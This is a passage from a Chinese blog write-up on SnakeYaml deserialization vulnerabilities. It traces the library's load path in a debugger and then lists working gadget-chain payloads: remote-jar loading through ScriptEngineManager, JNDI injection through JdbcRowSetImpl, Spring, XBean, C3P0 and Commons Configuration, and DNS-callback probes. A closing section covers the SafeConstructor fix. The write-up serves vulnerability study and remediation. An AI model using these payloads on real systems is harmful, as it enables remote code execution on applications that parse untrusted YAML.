  - 0b1010_0111_0100_1010_1110    #二进制表示\nnull:\n    nodeName: 'node'\n    parent: ~  #使用~表示null\nstring:\n    - 哈哈\n    - 'Hello world'  #可以使用双引号或者单引号包裹特殊字符\n    - newline\n      newline2    #字符串可以拆成多行，每一行会被转化成一个空格\ndate:\n    - 2022-07-28    #日期必须使用ISO 8601格式，即yyyy-MM-dd\ndatetime: \n    -  2022-07-28T15:02:31+08:00    #时间使用ISO 8601格式，时间和日期之间使用T连接，最后使用+代表时区\n\n看师傅推荐了一个 yml 文件转 yaml 字符串的地址，网上部分 poc 是通过 yml 文件进行本地测试的，实战可能用到的更多的是 yaml 字符串。https://www.345tool.com/zh-hans/formatter/yaml-formatter\nSnakeYaml 序列化与反序列化pom.xml 如下\n&lt;dependency>\n    &lt;groupId>org.yaml&lt;/groupId>\n    &lt;artifactId>snakeyaml&lt;/artifactId>\n    &lt;version>1.27&lt;/version>\n&lt;/dependency>\n\nSnakeYaml 提供了 Yaml.dump() 和 Yaml.load() 两个函数对 yaml 格式的数据进行序列化和反序列化。\n\nYaml.load()：入参是一个字符串或者一个文件，经过序列化之后返回一个 Java 对象；\nYaml.dump()：将一个对象转化为 yaml 文件形式；\n\ndump 是序列化，load 是序列化，这和 Python Pickle 反序列化的一样的\n写个序列化与反序列化的 Demo\n先写个实体类 Person.java\npackage SerializeTest;  \n  \npublic class Person &#123;  \n  \n    private String name;  \n    private Integer age;  \n  \n    public Person() &#123;  \n    &#125;  \n  \n    public Person(String name, Integer age) &#123;  \n        this.name = name;  \n        this.age = age;  \n    &#125;  \n  \n    public void printInfo()&#123;  \n        System.out.println(\"name is \" + this.name + \"age is\" + this.age);  \n    &#125;  \n  \n    public String getName() &#123;  \n        return name;  \n    &#125;  \n  \n    public void setName(String name) &#123;  \n        this.name = name;  \n    &#125;  \n  \n    public Integer getAge() &#123;  \n        return age;  \n    &#125;  \n  \n    public void setAge(Integer age) &#123;  \n        this.age = age;  \n    &#125;  \n&#125;\n\n序列化的代码\npublic static void serialize()&#123;  \n    Person person = new Person();  \n    person.setName(\"Drunkbaby\");  \n    person.setAge(20);  \n    Yaml yaml = new Yaml();  \n    String str = yaml.dump(person);  \n    System.out.println(str);  \n&#125;\n\n运行结果\n\n\n反序列化的代码\npublic static void unserialize()&#123;  \n    String str1 = \"!!SerializeTest.Person &#123;age: 20, name: Drunkbaby&#125;\";  \n    String str2 = \"age: 20\\n\" +  \n            \"name: Drunkbaby\";  \n    Yaml yaml = new Yaml();  \n    yaml.load(str1);  \n    yaml.loadAs(str2, Person.class);  \n&#125;\n\n序列化值 !!SerializeTest.Person &#123;age: 20, name: Drunkbaby&#125;\n这里的 !! 类似于 Fastjson 中的 @type 用于指定反序列化的全类名\n\n一开始以为只是这么简单的事儿，看了 Y4tacker 师傅的文章提到了要关于自动调用 getter/setter 的东西，感觉非常有意义。\n\n如果一个库的反序列化方法，能够自动调用 getter/setter 方法，那无疑是很危险的，比如 Fastjson hh\n改进了 Person.java，代码如下\npackage SerializeTest;  \n  \npublic class Person &#123;  \n  \n    private String name;  \n    private Integer age;  \n  \n    public Person() &#123;  \n        System.out.println(\"构造函数被调用\");  \n    &#125;  \n  \n    public void printInfo()&#123;  \n        System.out.println(\"name is \" + this.name + \"age is\" + this.age);  \n    &#125;  \n  \n    public String getName() &#123;  \n        System.out.println(\"getName 方法被调用\");  \n        return name;  \n    &#125;  \n  \n    public void setName(String name) &#123;  \n        System.out.println(\"setName 方法被调用\");  \n        this.name = name;  \n    &#125;  \n  \n    public Integer getAge() &#123;  \n        System.out.println(\"getAge 方法被调用\");  \n        return age;  \n    &#125;  \n  \n    public void setAge(Integer age) &#123;  \n        System.out.println(\"setAge 方法被调用\");  \n        this.age = age;  \n    &#125;  \n&#125;\n\n我们来看一看进行反序列化的时候，发生了什么\n\n\n很明显，调用了 setter 方法，如果我把反序列化的语句改成 &quot;!!SerializeTest.Person &#123;name: Drunkbaby&#125;&quot;，那么就只会调用 setter 中的 setName 方法\n\n同样，对于 loadAs() 与 loads() 也是如此，会调用对应的 setter 方法\n\n\n\n一些小坑的探索\n发现自己的有些基础性的东西还是不够敏感，修改了 Person.java，新增一个 public 的 school 以及 protected 的 province\n\npackage SerializeTest;  \n  \npublic class Person &#123;  \n  \n    private String name;  \n    private Integer age;  \n    public String school;  \n    protected String province;  \n  \n    public String getSchool() &#123;  \n        System.out.println(\"getSchool 方法被调用\");  \n        return school;  \n    &#125;  \n  \n    public void setSchool(String school) &#123;  \n        System.out.println(\"setSchool 方法被调用\");  \n        this.school = school;  \n    &#125;  \n  \n    public String getProvince() &#123;  \n        System.out.println(\"getProvince 方法被调用\");  \n        return province;  \n    &#125;  \n  \n    public void setProvince(String province) &#123;  \n        System.out.println(\"setProvince 方法被调用\");  \n        this.province = province;  \n    &#125;  \n  \n    public Person() &#123;  \n        System.out.println(\"构造函数被调用\");  \n    &#125;  \n  \n    public void printInfo()&#123;  \n        System.out.println(\"name is \" + this.name + \"age is\" + this.age);  \n    &#125;  \n  \n    public String getName() &#123;  \n        System.out.println(\"getName 方法被调用\");  \n        return name;  \n    &#125;  \n  \n    public void setName(String name) &#123;  \n        System.out.println(\"setName 方法被调用\");  \n        this.name = name;  \n    &#125;  \n  \n    public Integer getAge() &#123;  \n        System.out.println(\"getAge 方法被调用\");  \n        return age;  \n    &#125;  \n  \n    public void setAge(Integer age) &#123;  \n        System.out.println(\"setAge 方法被调用\");  \n        this.age = age;  \n    &#125;  \n&#125;\n\n在序列化的时候发现，getSchool 这个方法没被调用\n\n\n我们再去看一下反序列化的时候调用了哪些方法\n\n\n此处就出现了很有意思的地方，按照道理来说 public 类型的属性，是不会有这些问题的，有问题起码也是 protected 或者其他类型的属性，下面我们来打断点尝试分析一下。\nSnakeYaml 序列化与反序列化的调试分析序列化进来之后，是 dump() 方法，它先是 new 了一个 ArrayList，准备将之后序列化完成的数据存储到这个 ArrayList 里面\n\n\n跟进 dumpAll()，它是在做 dump() 的业务，把 Java 对象转换为 Yaml 类型的字符串。\n\n\n继续跟进 dumpAll() 方法，这里面做了具体的业务\n\n\n这里先 new 了一个 Serializer 类，Serializer 对象里面放了一个 Emitter 对象；后续，Yaml 将序列化的数据保存到 data 这个对象里面暂存，进行处理，我们跟进一下 represent() 方法\n\n\n跟进 representData() 方法，会过一堆判断，但是都不会进去，因为这个属性值是初始被赋值的，我们未修改。\n\n\n我们可以看到，基本上没有做数据处理，所以继续跟进 representData()\n\n\n跟进 representJavaBean()，在 representJavaBean() 方法里面，很明显看到我们的对象数据已经保存到了 javaBean 这个变量里面，并把数据按照 key Value 的键值对形式保存到了 properties 变量里\n\n\n显而易见的是，representJavaBean() 是一个处理数据，也就是 Yaml 序列化的封装的一层，我们继续跟进 representJavaBeanProperty() 方法，representJavaBeanProperty() 方法做了关于把对象当中的数据拆解成键值对的工作。\n\n\n大致的工作流程就是如上所示，最后我们的键值对会保存到 list 当中，很可惜的是我并没有找到为什么在序列化的时候不去调用对应的 getter 方法。\n有兴趣的师傅们可以自行打断点调试一下，，而且我并没有找到关于 public 类为何没有去调用对应的 getter 方法的这么一个代码块，还应该是我自己断点下的不够好，回过头看一看反序列化吧\n反序列化打完断点，开始调试，跟进 load() 方法。\n在 load() 方法中会先 new 一个 StreamReader，将 yaml 数据通过构造函数赋给 StreamReader，再调用 loadFromReader() 方法，跟进\n\n\nloadFromReader() 方法调用了 BaseConstructor.getSingleData() 方法，里面的 type 是 java.lang.Object，跟进一下\n\n\n跟进 getSingleData() 方法中，先创建一个 Node 对象（其中调用 getSingleNote() 会根据流来生成一个文件，即将字符串按照 yaml 语法转为 Node 对象），然后判断当前 Node 是否为空且是否 Tag 为空，若不是则判断 yaml 格式数据的类型是否为 Object 类型、是否有根标签，这里都判断不通过，最后返回调用 constructDocument() 方法的结果；我们继续跟进一下 constructDocument() 方法\n\n\nconstructDocument() 方法的最终目的是构建一个完整的 YAML 文件，如果文件是递归结构，再进行二次处理（这里的递归结构其实就是我后面会讲的 [!!] 这个）。我们这里跟进一下 constructObject() 方法\n\n\nconstructObject() 方法从指定节点构造对象，如果该节点已经构造了，那就返回一个实例化过的对象\n\n\n这里我们的节点并没有被构造过，所以会跳到 constructObjectNoCheck() 下，跟进\n\n\n我们仔细看一看关于节点构造的业务实现：先把当前节点的内容放到 recursiveObjects 里面，recursiveObjects 是一个 Set 集合类。往下进行了一个判断 ———— constructedObjects 是否构造了对应的节点，如果构造了，通过 get() 方法获取到它，如果没有构造，调用 constructor.construct()\n\n\n这时候我们可以看到 constructor 变量是 Constructor 的内部类 ———— ConstructYamlObject，所以我们去到 Constructor$ConstructYamlObject 的 construct() 方法处下个断点。跟进\n\n\n这里没什么内容，继续跟进，业务不是在外层做的\n\n\n跟进 construct 会直接跳进 getClassForNode() 这个方法，它是通过反射，给 Node 节点选取合适的构造类。如图，getClassForNode() 通过我们传入的字符串，将 !! 以及后面的内容成功解析，找到了合适的构造类\n\n\n获取构造类是通过反射获取的，Y4tacker 师傅还提到了这里可以初始化静态块里面的函数，这是一个很值得被注意的点。\n\n\n\n获取合适的构造类这一块结束了，我们跟进 getConstructor()\n\ngetConstructor() 构造了 JavaBean，并且在后面进行了构造类（也就是上一步合适的构造类）的实例化\n\n\n继续跟进，constructJavaBean2ndStep() 方法，进行 JavaBean 构造的第二步：其中会获取 yaml 格式数据中的属性的键值对，然后调用 propert.set() 来设置新建的目标对象的属性值\n\n\n\n至此，分析过程全部结束。\n\npublic 的 getter 方法不能被调用的原因\n关于为什么 public 的类的 getter 方法不能被调用，实际上是因为这里：\n\n在反序列化的最后一步，会调用 propert.set() 来设置新建的目标对象的属性值\n\n\n而这个 Property 的设置在org.yaml.snakeyaml.introspector.PropertyUtils#getPropertiesMap\n\n\n可以看到这个如果是 Public 修饰的话，后面会调用 org.yaml.snakeyaml.introspector.FieldProperty#get，这个只是反射获取值\n\n\n\n0x03 SnakeYaml 反序列化漏洞之 SPI 链子漏洞原理比较类似于 Fastjson 的漏洞，这里的 !! 就是 Fastjson 漏洞里面的 @type\n与 Fastjson 不同的是，Fastjson 可以调用的 getter/setter 方法的攻击面很宽，而 SnakeYaml 只能够调用非 public，static 以及 transient 作用域的 setter 方法\n\n下面我们看一看可利用的 Gadgets，因为去挖掘比较费时间，感觉意义可能也不是特别重大，就直接看 Y4tacker 师傅的文章了\n\n利用 SPI 机制 - 基于 ScriptEngineManager 利用链\n这一条链子需要重点关注一下，其他的链子可以放一放，比较简单。\n\n调用栈newInstance:396, Class (java.lang)  \nnextService:380, ServiceLoader$LazyIterator (java.util)  \nnext:404, ServiceLoader$LazyIterator (java.util)  \nnext:480, ServiceLoader$1 (java.util)  \ninitEngines:122, ScriptEngineManager (javax.script)  \ninit:84, ScriptEngineManager (javax.script)  \n&lt;init>:75, ScriptEngineManager (javax.script)  \nnewInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)  \nnewInstance:62, NativeConstructorAccessorImpl (sun.reflect)  \nnewInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)  \nnewInstance:423, Constructor (java.lang.reflect)  \nconstruct:557, Constructor$ConstructSequence (org.yaml.snakeyaml.constructor)  \nconstruct:341, Constructor$ConstructYamlObject (org.yaml.snakeyaml.constructor)  \nconstructObject:182, BaseConstructor (org.yaml.snakeyaml.constructor)  \nconstructDocument:141, BaseConstructor (org.yaml.snakeyaml.constructor)  \ngetSingleData:127, BaseConstructor (org.yaml.snakeyaml.constructor)  \nloadFromReader:450, Yaml (org.yaml.snakeyaml)  \nload:369, Yaml (org.yaml.snakeyaml)  \nmain:10, Demo (BasicKnow.SnakeymlUnser)\n\n\nEXP 与攻击EXP 如下\npublic class SPInScriptEngineManager &#123;  \n    public static void main(String[] args) &#123;  \n        String payload = \"!!javax.script.ScriptEngineManager \" +  \n                \"[!!java.net.URLClassLoader \" +  \n                \"[[!!java.net.URL [\\\"http://ne54u1uv8ygp87bbl3fc5gvvsmycm1.oastify.com\\\"]]]]\\n\";  \n        Yaml yaml = new Yaml();  \n        yaml.load(payload);  \n    &#125;  \n&#125;\n\n成功接收到 URLDNS 请求\n\n\n但是这个 EXP 只能简单的进行探测，如果要打的化，可以用这一个 Github 项目，其实这个项目在各大 CTF 比赛里面也被经常提及与使用 ———— https://github.com/artsploit/yaml-payload/\n直接修改代码即可，脚本也比较简单，就是实现了 ScriptEngineFactory 接口，然后在静态代码块处填写需要执行的命令。将项目打包后挂载到 vps 端，使用 payload 进行反序列化后请求到该位置，实现 java.net.URLClassLoader 调用远程的类进行执行命令。\nEXP\npublic class SPInScriptEngineManager &#123;  \n    public static void main(String[] args) &#123;  \n        String payload = \"!!javax.script.ScriptEngineManager \" +  \n                \"[!!java.net.URLClassLoader \" +  \n                \"[[!!java.net.URL [\\\"http://localhost:7777/yaml-payload.jar\\\"]]]]\\n\";\n        Yaml yaml = new Yaml();  \n        yaml.load(payload);  \n    &#125;  \n&#125;\n\n\n\nSPI 机制SPI 以及 ScriptEngineManager 最早是在 SpEL 表达式里面被提到的，这次趁着学习 SnakeYaml 的机会，好好看一遍。\nSPI ，全称为 Service Provider Interface，是一种服务发现机制。它通过在 ClassPath 路径下的 META-INF/services 文件夹查找文件，自动加载文件里所定义的类。也就是动态为某个接口寻找服务实现\n那么如果需要使用 SPI 机制需要在 Java classpath 下的 META-INF/services/ 目录里创建一个以服务接口命名的文件，这个文件里的内容就是这个接口的具体的实现类。\n\n\nSPI是一种动态替换发现的机制，比如有个接口，想运行时动态的给它添加实现，你只需要添加一个实现。\n\n这里拿 JDBC 的库 ———— mysql-connector-java 来举个例子\n\n这里就是在 Java classpath 下的 META-INF/services/ 定义实现类。\n\n\n接着，我们定位到那个类里面进去\n\n\n继续跟进，去到 java.sql.Driver\n\n\n而数据库有很多种类型，而实现方式不尽相同，而在实现各种连接驱动的时候，只需要添加java.sql.Driver实现接口，然后 Java 的 SPI 机制可以为某个接口寻找服务实现，就实现了各种数据库的驱动连接。\n实现细节：程序会通过 java.util.ServiceLoder 动态装载实现模块，在 META-INF/services 目录下的配置文件寻找实现类的类名，通过 Class.forName 加载进来， newInstance() 反射创建对象，并存到缓存和列表里面。\n漏洞分析\n在已知 SPI 机制的情况下，自己尝试的独立思考\n\n由于 SPI 机制的存在，能够方便很多的开发，方便永远是安全最大的敌人，在正常情况下，SPI 是不存在安全问题的，但是由于它的机制问题，我们不可能不忽视它的安全隐患 ———— 这也是我在前文说的：**”Y4tacker 师傅还提到了这里可以初始化静态块里面的函数，这是一个很值得被注意的点。”**\n我们通过 SnakeYaml 能够调用任意 setter 的机制，同样可以调用 ScriptEngineFactory 来实现攻击，因为 ScriptEngineFactory 利用的底层也是 SPI 机制。\n通过 yaml_payload 这个工具不难理解，我们去看它的  META-INF/services 目录下的配置文件寻找实现类的类名\n\n\n\n\n\n已经分析得差不多了，不妨调试一下后续回过头来，才发现这句 “不妨调试一下”，难度有多么大，其实原理上是和 Fastjson 差不多的，但是因为当时没有把 Fastjson 代码看深，所以理解起 SnakeYaml 的代码就比较累了。没办法，啃。\n\n\n前面对于基础的反序列化的调试大同小异，这里我们直接从 org.yaml.snakeyaml.constructor.Constructor#getClassForName() 这里开始看，去理解 SPI 机制造成的攻击\n\n这里会把所有的类加载进来，把这些类保存到\n\n\n\n\n刚才我们是跟进了这个语句 —— getConstructor(node).construct(node) 的 getConstructor 方法，它的返回值是一个 Construct 类中的内部类\n\n\n这里我们继续跟进 construct() 方法，前面都是一些简单判断，我们先跳过\n\n\n关键点在这个地方！\n\n\n我们先把 snode 里面的 value 拿出来，赋给 possibleConstructors，snode 中就是存储了上文 EXP 中的三个类；会将这三个类的无参构造放进 possibleConstructors 中\n\n\n而后将获取到的 possibleConstructors 获取到的第一个数组进行赋值并转换成 Constructor 类型，\n\n\n之后，对 c 进行实例化，我们可以跟进看一下，后续也都是一串 newInstance() 的调用，快进一下，直接到 newInstance0 这里\n\n\n一开始加载的是 URL 类的，因为我们的 EXP 里面包含了三个类，这就和 Fastjson 的 AutoType 是一样的，前两个类作为第三个类的缓存。\n\n\n\n\n接着，当执行完 newInstance() 的时候，会到 ScriptEngineManager 里面，触发 SPI 机制\n\n\ninit 方法做了一系列赋值，继续往下，跟进 initEngines()。\ninitEngines() 方法这里 ServiceLoader&lt;ScriptEngineFactory&gt; 就是用到 SPI 机制，会通过远程地址寻找 META-INF/services 目录下的 javax.script.ScriptEngineFactory 然后去加载文件中指定的 PoC 类从而触发远程代码执行；跟进 next()\n\n\n会进入 ServiceLoader$LazyIterator#next() 方法，调用了 lookupIterator#next，它里面有一个 nextService() 方法来实现具体的业务\n\n\n继续跟进，先反射获取的 class 对象，之后 newInstance 实例化,这里第一次实例化的是 NashornScriptEngineFactory 类，之后第二次会去实例化我们远程 jar 中的 PoC 类，从而触发静态代码块&#x2F;无参构造方法的执行来达到任意代码执行的目的\n\n\n\n\n这里执行恶意代码\n\n\n细究深入的调用栈，应该是这样的\n\n\n0x04 SnakeYaml 反序列化漏洞的 Gadgets在说 gadgets 之前有一些很有必要的基础知识我们先来看一看 SPI 链子的 EXP \nString payload = \"!!javax.script.ScriptEngineManager \" +  \n        \"[!!java.net.URLClassLoader \" +  \n        \"[[!!java.net.URL [\\\"http://ne54u1uv8ygp87bbl3fc5gvvsmycm1.oastify.com\\\"]]]]\\n\";  \n\n这里的 [!! 是作为 javax.script.ScriptEngineManager 的属性的，就等于我调用了 javax.script.ScriptEngineManager 这个类，其实我是在调用它的构造函数，如图，这是 javax.script.ScriptEngineManager 的构造函数\n\n\n我们传进去的 URLClassLoader 是作为 ClassLoader 传进去的，所以这个就传成功了\n那么后面的 java.net.URL 呢，它是 [[!! 打头，说明是 URLClassLoder 的内部属性，我们可以去看 URLClassLoader 的构造函数，它要求我们传入一个 URL 类，所以 EXP 是这么来的\n\n\n有很多师傅的文章里面没有提及这一条，当时我自己也是没搞懂索性在奶思师傅的一些指点下，弄得非常明白了！\n这里的内容也印证之前反序列化的内容中，说的那条递归结构，就是这个意思\nJdbcRowSetImpl\n调用链比较简单，尾部是 JNDI 注入，是在 com.sun.rowset.JdbcRowSetImpl 的 connect() 方法\n\n\n\n找到了 setAutoCommit 是可被利用的 setter 方法\n调用链\nJdbcRowSetImpl#setAutoCommit\n\tJdbcRowSetImpl#connect\n\t\tInitialContext#lookup\n\n是相对简单的，这里不再做分析\n\n\n同样 RMI 也可以\nString poc = \"!!com.sun.rowset.JdbcRowSetImpl &#123;dataSourceName: \\\"rmi://127.0.0.1:1099/Exploit\\\", autoCommit: true&#125;\";\n\n同时，我们要去触发的恶意 dataSource 属性的作用域是private，所以可用\nSpring PropertyPathFactoryBeanEXP 如下\npublic class SpringPropertyPathFactoryBeanEXP &#123;  \n    public static void main(String[] args) &#123;  \n        String payload = \"!!org.springframework.beans.factory.config.PropertyPathFactoryBean\\n\" +  \n                \" targetBeanName: \\\"ldap://localhost:1389/Exploit\\\"\\n\" +  \n                \" propertyPath: Drunkbaby\\n\" +  \n                \" beanFactory: !!org.springframework.jndi.support.SimpleJndiBeanFactory\\n\" +  \n                \"  shareableResources: [\\\"ldap://localhost:1389/Exploit\\\"]\";  \n        Yaml yaml = new Yaml();  \n        yaml.load(payload);  \n    &#125;  \n&#125;\n\n\n\n同样用 RMI 也是可以的\n可以看到在 org.springframework.beans.factory.config.PropertyPathFactoryBean#setBeanFactory\n\n\n跟进 getBean()\n\n\n继续跟进，找到 Jndi 注入的地方\n\n\n当然这里还有个限制是 this.beanFactory.isSingleton(this.targetBeanName)，需要设置 shareableResources 即可\nApache XBean\n无版本限制\n\n&lt;dependency>  \n  &lt;groupId>org.apache.xbean&lt;/groupId>  \n  &lt;artifactId>xbean-naming&lt;/artifactId>  \n  &lt;version>4.20&lt;/version>  \n&lt;/dependency>\n\n这条链子因为是第一次见，而且感觉这条链子比较有意思，这里我们深入分析一下，也从漏洞发现者的角度出发，思考这条 Gadget\n链尾在 ContextUtil 的内部类 ReadOnlyBinding 里面的 getObject() 方法里面，调用了 ContextUtil.resolve()\n\n\n跟进看一看  ContextUtil.resolve()，在这里第 55 行，找到了一个 Jndi 注入的注入点\n\n\n\n此处就找到我们的链尾了\n\nEXP 的分析与构造（重要）如果按照平常的思路，EXP 该怎么写的？\n应该是这样子吧：\nString payload = \" !!org.apache.xbean.naming.context.ContextUtil$ReadOnlyBinding \" +  \n        \"[ \\\"foo\\\",!!javax.naming.Reference [\\\"foo\\\", \\\"JndiCalc\\\", \\\"http://localhost:7777/\\\"]]\";\n\n这个 EXP 师傅们可以自行调试一下，问题在哪儿呢，是在 constructor 类的地方，抛出了异常\n\n\n抛出异常的信息说：在 org.apache.xbean.naming.context.ContextUtil$ReadOnlyBinding 这里，它的构造函数里面，没有这个对应的属性，我们可以去看一下 org.apache.xbean.naming.context.ContextUtil$ReadOnlyBinding 的构造函数做了什么事\n\n\nvalue 属性是传入到 resolve() 方法中去的，作为恶意 Reference，那为什么我们不直接修改 value 的属性呢？我们也可以写一个 EXP 来测试一下\nString payload = \" !!org.apache.xbean.naming.context.ContextUtil$ReadOnlyBinding \" +  \n        \" value: !!javax.naming.Reference [\\\"foo\\\", \\\"JndiCalc\\\", \\\"http://localhost:7777/\\\"]\";\n\n在调试的过程中发现，会进入到 SafeConstructor 这个类\n\n\n接着就会抛出异常\n\n\n虽然但是，这个地方返回值是一个 Map 类型的值，不禁让我想起了 Fastjson JdbcRowSetImpl 那条 EXP 里面，用到过这种绕过姿势，所以我觉得这个地方是有潜力可挖的（埋个坑，后续分析\n\n回归正题，为什么会造成这个影响呢？这其实和 value 的作用域有关\n\nvalue 作用域是 final，是不可以随意修改的，连反射也无法修改它，所以这里就进入到了 SafeConstructor\n\n那么要如何才能给 value 赋值呢？这里就用到了 BadAttributeValueExpException 这个类\n\n\n\n由于 val 这里接受的是一个 Object 类，所以我们可以把 org.apache.xbean.naming.context.ContextUtil$ReadOnlyBinding 作为 val 传入，太妙了！\n我们尝试构造这么一个 EXP，把参数传进去\nString test3 = \"!!javax.management.BadAttributeValueExpException \" +  \n        \"[!!org.apache.xbean.naming.context.ContextUtil$ReadOnlyBinding \" +  \n        \"[value: !!javax.naming.Reference [\\\"foo\\\", \\\"JndiCalc\\\", \\\"http://localhost:7777/\\\"]]]\";\n\n这里的 EXP 证明我的想法是对的，加载到了 BadAttributeValueExpException\n\n\n但是这里，子类加载不进来了，所以抛出了异常，原因是没有把构造函数搞全\n\n\n因为要传全构造函数，所以我们这里还应该传入 Context context 以及 String name，对于 Context，我们选择传入 org.apache.xbean.naming.context.WritableContext\n所以这么一条 EXP 就构造出来了，现在我们要去思考如何触发 getObject() 方法\nString payload = \"!!javax.management.BadAttributeValueExpException \" +  \n        \"[!!org.apache.xbean.naming.context.ContextUtil$ReadOnlyBinding \" +  \n        \"[\\\"Drunkbaby\\\",!!javax.naming.Reference [\\\"foo\\\", \\\"JndiCalc\\\", \\\"http://localhost:7777/\\\"],\" +  \n        \"!!org.apache.xbean.naming.context.WritableContext []]]\";\n\n其实这个 EXP 误打误撞的碰上了，我们再去看一眼 BadAttributeValueExpException 的构造函数\n\n\n它调用了 toString() 方法，而 val 正是我们后面通过 Yaml 传进去的 org.apache.xbean.naming.context.ContextUtil$ReadOnlyBinding，它是没有 toString() 方法的，但是它的父类是有的，这和 Fastjson 里面也非常相似。\n\n\n父类的 toString() 方法调用了 getObject() 方法，所以这条链子就成立了，太妙了\n\n\n\nC3P0 JndiRefForwardingDataSource\nC3P0 这条链子在 C3P0 的文章里面已经有比较细致的跟过了，这里便不再赘述，放个 EXP\n\npublic class C3P0JndiRefForwardingDataSourceEXP &#123;  \n    public static void main(String[] args) &#123;  \n        String payload = \"!!com.mchange.v2.c3p0.JndiRefForwardingDataSource\\n\" +  \n                \"  jndiName: \\\"rmi://localhost/Exploit\\\"\\n\" +  \n                \"  loginTimeout: 0\";  \n        Yaml yaml = new Yaml();  \n        yaml.load(payload);  \n    &#125;  \n&#125;\n\n\n\nC3P0 WrapperConnectionPoolDataSource\n同样也是 C3P0 的一条链子，关于 C3P0 的链子可以看我这篇文章\n\nJava反序列化之C3P0链\nEXP 如下\nString poc = \"!!com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\\n\" +  \n\"  userOverridesAsString: \\\"HexAsciiSerializedMap:aced00057372003d636f6d2e6d6368616e67652e76322e6e616d696e672e5265666572656e6365496e6469726563746f72245265666572656e636553657269616c697a6564621985d0d12ac2130200044c000b636f6e746578744e616d657400134c6a617661782f6e616d696e672f4e616d653b4c0003656e767400154c6a6176612f7574696c2f486173687461626c653b4c00046e616d6571007e00014c00097265666572656e63657400184c6a617661782f6e616d696e672f5265666572656e63653b7870707070737200166a617661782e6e616d696e672e5265666572656e6365e8c69ea2a8e98d090200044c000561646472737400124c6a6176612f7574696c2f566563746f723b4c000c636c617373466163746f72797400124c6a6176612f6c616e672f537472696e673b4c0014636c617373466163746f72794c6f636174696f6e71007e00074c0009636c6173734e616d6571007e00077870737200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78700000000000000000757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000a70707070707070707070787400074578706c6f6974740016687474703a2f2f6c6f63616c686f73743a383030302f740003466f6f;\\\"\";\n\n二次反序列化的 payload\nApache Commons Configuration依赖包\n&lt;dependency>  \n    &lt;groupId>commons-configuration&lt;/groupId>  \n    &lt;artifactId>commons-configuration&lt;/artifactId>  \n    &lt;version>1.10&lt;/version>  \n&lt;/dependency>\n\npayload 如下\npoc = \"!!org.apache.commons.configuration.ConfigurationMap [!!org.apache.commons.configuration.JNDIConfiguration [!!javax.naming.InitialContext [], \\\"rmi://127.0.0.1:1099/Exploit\\\"]]: 1\";\n\n\n这条链子是参考 Y4tacker 师傅写的，我个人觉得这条链子是由一些问题的\n\n主要是触发的时候是利用 key 调用 hashCode() 方法所产生的利用链，还是简单说下调用链吧\n在对 ConfigurationMap 调用 hashCode() 的时候实际上是执行了 java.util.AbstractMap#hashCode()\npublic int hashCode() &#123;  \n    int h = 0;  \n    Iterator&lt;Entry&lt;K,V>> i = entrySet().iterator();  \n    while (i.hasNext())  \n        h += i.next().hashCode();  \n    return h;  \n&#125;\n\n之后会调用  org.apache.commons.configuration.ConfigurationMap.ConfigurationSet#iterator()\n之后就可以配合 JNDIConfiguration 实现 Jndi 注入\nlookup:417, InitialContext (javax.naming)  \ngetBaseContext:452, JNDIConfiguration (org.apache.commons.configuration)  \ngetKeys:203, JNDIConfiguration (org.apache.commons.configuration)  \ngetKeys:182, JNDIConfiguration (org.apache.commons.configuration)\n\n0x05 SnakeYaml 的探测这一块内容 RoboTerh 师傅总结的很好\nSPI 的探测链子这其实用之前的 SPI 机制的链子就可以，我这里就不放了，说一下万一 SPI 机制被 ban 的情况下，如何绕过\n使用 Key 调用 hashCode 方法探测EXP 如下\nString payload = \"&#123;!!java.net.URL [\\\"http://ra5zf8uv32z5jnfyy18c1yiwfnle93.oastify.com/\\\"]: 1&#125;\";\n\n\n\n我们根据urldns链可以知道key会进行hashCode方法的调用，之后进行urldns的解析\nSnakeYaml在进行map的处理的时候将会对key进行hashCode处理，所以我们尝试map的格式\nHashMap hashMap = new HashMap();\n    hashMap.put(\"a\", \"a\");\n    hashMap.put(\"b\", \"b\");\n    System.out.println(yaml.dump(hashMap));\n// &#123;a: a, b: b&#125;\n\n所以我们就可以按照这种使用&#123; &#125;包裹的形式构造map，然后将指定的URL置于key位置\n探测内部类String poc = \"&#123;!!java.util.Map &#123;&#125;: 0,!!java.net.URL [\\\"http://tcbua9.ceye.io/\\\"]: 1&#125;\";\n\n在前面加上需要探测的类，在反序列化的过程中如果没有报错，说明反序列化成功了的，进而存在该类\n这里创建对象的时候使用的是&#123;&#125;这种代表的是无参构造，所以需要存在有无参构造函数，不然需要使用[]进行复制构造\n0x06 SnakeYaml 漏洞的修复SnakeYaml 官方并没有把这一种现象作为漏洞看待，所以它的修复方法是这样的\n加入 new SafeConstructor() 类进行过滤，这个类的相关作用在手写 XBean EXP 的时候也遇上过，我们现在把它拿到实战上面来\npublic class main &#123;\n    public static void main(String[] args) &#123;\n\n        String context = \"!!javax.script.ScriptEngineManager [\\n\" +\n                \"  !!java.net.URLClassLoader [[\\n\" +\n                \"    !!java.net.URL [\\\"http://127.0.0.1:8888/yaml-payload-master.jar\\\"]\\n\" +\n                \"  ]]\\n\" +\n                \"]\";\n        Yaml yaml = new Yaml(new SafeConstructor());\n        yaml.load(context);\n    &#125;\n\n&#125;\n\n再次进行反序列化会抛异常。\n\n\n再者就是拒绝不安全的反序列化操作，反序列化数据前需要经过校验或拒绝反序列化数据可控。不过这样的修洞就是大修了\n0x07 小结\n在这一篇文章里的小结倒是想多说一点哈哈\n\n自己算是第一次独立分析反序列化的深层次代码，收获到了很多东西，在其他师傅没有对应的文章讲述逻辑的情况下，自己把代码看懂了，算是给了自己不少的鼓励和信心。\n在 XBean EXP 那里一度的理解比较挣扎，好在后面是搞懂了，并且手写了 EXP，从 0 - 0.1 吧，实际上还发现了 NamingManger 这里也是存在安全隐患的，但是没有深入去挖，这里也是让自己 mark 一下，寻找存在的可用 Gadget。\n包括在上面的 SafeConstructor 类里面做的过滤手段，返回值是一个 Map 类，和 Fastjson 的 1.2.67 版本提出的利用方式有异曲同工之妙，这里也给自己 mark 一下。\n当然，其实 SnakeYaml 本身的利用范围就比较有限，如果我 SnakeYaml 的 Gadget 可用，那么在 Fastjson 当中，这条 Gadget 也一定是可用的。\n0x08 